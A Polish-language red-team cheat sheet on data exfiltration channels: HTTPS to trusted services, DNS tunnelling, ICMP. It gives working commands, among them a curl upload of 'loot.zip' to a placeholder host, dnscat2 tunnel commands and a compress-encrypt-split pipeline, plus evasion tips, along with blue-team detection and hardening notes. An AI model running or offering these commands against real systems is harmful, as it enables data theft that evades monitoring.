---
title: "Kanały exfiltracji danych"
category: "red-team"
tags: ["exfiltration", "data-theft"]
platform: "agnostic"
mitre: ["T1041", "T1048"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Kanały exfiltracji

## TL;DR
Wyprowadzanie danych ukrytymi kanałami: DNS, HTTPS do zaufanych usług, ICMP, kanałem C2. Kompresuj + szyfruj + dziel na kawałki.

## Techniki
```bash
# HTTPS do zaufanej usługi (blends in)
curl -X POST --data-binary @loot.zip https://storage.example.com/up

# DNS tunneling (małe porcje w subdomenach)
# iodine / dnscat2
dnscat2-server corp.local
dnscat2 --dns server=10.10.14.1,domain=corp.local

# ICMP
# hping3 / ptunnel do przemytu w payloadzie echo

# Przygotowanie: kompresja + szyfrowanie + chunk
tar czf - /data | openssl enc -aes-256-cbc -pbkdf2 -k 'key' | split -b 1M - chunk_
```

## OPSEC
- Throttle (limit pasma), godziny robocze, zaufane domeny/CDN.
- Unikaj wielkich pojedynczych transferów — rozłóż w czasie.

## Wykrywanie (Blue Team)
```text
DNS   – długie/losowe subdomeny, wysoka liczba TXT/NULL, jeden host->wiele zapytań
HTTPS – duży upload do świeżych/nietypowych domen, anomalia wolumenu wychodzącego
ICMP  – nietypowo duże/echa z payloadem
DLP   – wzorce danych wrażliwych (PII/PAN) w ruchu wychodzącym
```

## Mitygacja / Hardening
- DLP, egress filtering, proxy z inspekcją i logowaniem.
- Ogranicz DNS wychodzący do wewnętrznych resolverów; alert na tunelowanie.
- Blokada kategorii/CDN nieużywanych biznesowo.

## Źródła
- [MITRE Exfiltration](https://attack.mitre.org/tactics/TA0010/)
